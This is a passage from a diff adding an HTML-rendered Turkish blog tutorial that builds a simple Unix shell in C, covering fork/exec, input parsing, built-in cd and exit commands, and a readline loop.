+                    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code&gt;run()&lt;/code&gt; ise yukarda belirttiğimiz gibi çalıştırma işlemini gerçekliyor.
+Bunu yaparken &lt;code&gt;fork()&lt;/code&gt; ile bir kopya proses oluşturuyor önce, sonra iki alernatifimiz var &lt;code&gt;execv()&lt;/code&gt; ve &lt;code&gt;execvp()&lt;/code&gt;.
+&lt;code&gt;execv&lt;/code&gt; tam dosya yolu ile çalşıyor yani komut satırından &lt;code&gt;/bin/ls&lt;/code&gt; gibi bir komut geldiğinde &lt;code&gt;execv&lt;/code&gt; devreye giriyor.
+&lt;code&gt;execvp&lt;/code&gt; ise verilen komutu &lt;code&gt;PATH&lt;/code&gt; te aratıyor. Yani &lt;code&gt;ls&lt;/code&gt; diye bir komut geldiğinde bu sefer devreye &lt;code&gt;execvp&lt;/code&gt; giriyor.
+2.argüman olarak ikiside komutlardan ve argümanlardan oluşan bir dizi alıyor.(&lt;code&gt;arguments&lt;/code&gt;)
+&lt;code&gt;waitpid&lt;/code&gt;  ise kabaca kopyalanan prosesin sonlandığından emin olmamızı sağlıyor.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str_p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;command_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+            &lt;span class=&quot;n&quot;&gt;add_history&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strsep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strdup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;komut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;komut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Sadece program adı ya da tam yolu girin !!!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code&gt;parse()&lt;/code&gt; fonksiyonu komut satırından aldığımız &lt;code&gt;ls -l /home&lt;/code&gt; gibi bir stringi bize &lt;code&gt;[&amp;quot;ls&amp;quot;, &amp;quot;-l&amp;quot;, &amp;quot;/home&amp;quot;]&lt;/code&gt; şeklinde geri döndürüyor.
+Bunu yapmamızın nedeni ise &lt;code&gt;execv&lt;/code&gt; ve &lt;code&gt;execvp&lt;/code&gt; argüman dizisi ile çalışıyor olması. Aslında buradaki problem basit bir stringi boşluklara göre
+böl problemi. Bunu çözerken &lt;code&gt;strsep&lt;/code&gt; adında bir hazır fonksiyon kullandım. Eğer program bir &lt;code&gt;built-in&lt;/code&gt; fonksiyonsa daha önceden oluşturduğumuz tablodan bakıp komutu çalıştırıyor.
+&lt;code&gt;add_history&lt;/code&gt; bize komut geçmişi yaratmamızı sağlıyor. Komut ekranında beklerken yön tuşları ile daha önceki komutları erişebiliyoruz.
+Burada bir de kontrol işlemi yapıyoruz. Girilen komut &lt;code&gt;bin/ls&lt;/code&gt;  ve ya türevleri şeklindeyse bir uyarı verip tekrar komut istiyoruz.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;command_cd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;~&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;HOME&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;cm&quot;&gt;/* none */&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;..&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parent_directory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strrchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;PWD&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;PWD&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parent_directory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Basit bir &lt;code&gt;cd&lt;/code&gt; programının gerçeklemesi. İlk &lt;code&gt;if&lt;/code&gt; ifadesinde &lt;code&gt;home&lt;/code&gt; dizinine gideceğimiz durumları kontrol ediyoruz. &lt;code&gt;chdir()&lt;/code&gt; fonksiyonu için
+anlamsız olan ~ ve boşluk karakterleri gelince ne yapacağını söylüyoruz. İkininci blokta ise linux &lt;code&gt;bulunduğumuz dizin&lt;/code&gt; anlamına gelen &lt;code&gt;.&lt;/code&gt; karaterini soyutluyoruz. Üçüncü blokta ise &lt;code&gt;bir üst dizin&lt;/code&gt; anlamına gelen &lt;code&gt;..&lt;/code&gt; karaterini soyutluyoruz. Bunu yaparken &lt;code&gt;strrchr&lt;/code&gt; fonskiyonunda yardım alıyoruz. Bu fonksiyon  verilen karakteri string içinde arıyor ve en son bulduğu indisten sonraki kısmını döndürüyor. Yani &lt;code&gt;/home/mhmt/Desktop&lt;/code&gt; için
+&lt;code&gt;/Desktop&lt;/code&gt; döndürecektir. Bu durumda &lt;code&gt;parent_directory&lt;/code&gt; &lt;code&gt;/Desktop&lt;/code&gt; olacaktır. &lt;code&gt;pwd&lt;/code&gt; ise &lt;code&gt;/home/mhmt/Desktop&lt;/code&gt; değerini tutacaktır. Pointer aritmetiği sayesinde &lt;code&gt;index&lt;/code&gt; yardımı ile son &lt;code&gt;/&lt;/code&gt; karakterinin yerini buluyoruz ve sonraki kısmı atıyoruz. Böylece bir üst dizinin yoluna ulaşmış olduk.
+&lt;code&gt;else&lt;/code&gt; ile verilen dizin yoluna geçiş yapıyoruz.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;command_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Anlayacağınız üzere  programdan çıkmamızı sağlıyor.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;command_t&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;find_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;commands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;commands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;commands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code&gt;find_command&lt;/code&gt; fonksiyonu aşığadaki tablo da daha önceden yazdığımız &lt;code&gt;built-in&lt;/code&gt; komutlarda arama yapıp varsa komutu ilgili fonksiyona döndürüyor.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;command_t&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;commands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;cd&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command_cd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;quit&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;exit&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Komut ismi ve ilgili fonksiyonun pointerindan  oluşan bir &lt;code&gt;command_t&lt;/code&gt; veri tipimiz var. Hemen sonrasında ise bu veri tipi kullanılarak oluşturulmuş bir
+&lt;code&gt;commnands&lt;/code&gt; dizisi var. Burada tablo yönemli programlama kullanmamızın nedeni gereksiz &lt;code&gt;if - else&lt;/code&gt; bloklarından kaçınmak için.&lt;br&gt;
+``` c
+    int
+    main(void)
+    {
+            for ( ; ; ) {
+                    komut = readline(&amp;quot;#&amp;gt; &amp;quot;);
+                    if (komut == NULL) {
+                            exit(EXIT&lt;em&gt;SUCCESS);
+                    } else if (!strcmp(komut, &amp;quot;&amp;quot;)) {
+                            continue;
+                    } else {
+                            parse(komut);
+                            run();
+                            argv&lt;/em&gt;free();
+                    }
+                    free(komut);
+            }
+            atexit(argv_free);&lt;/p&gt;
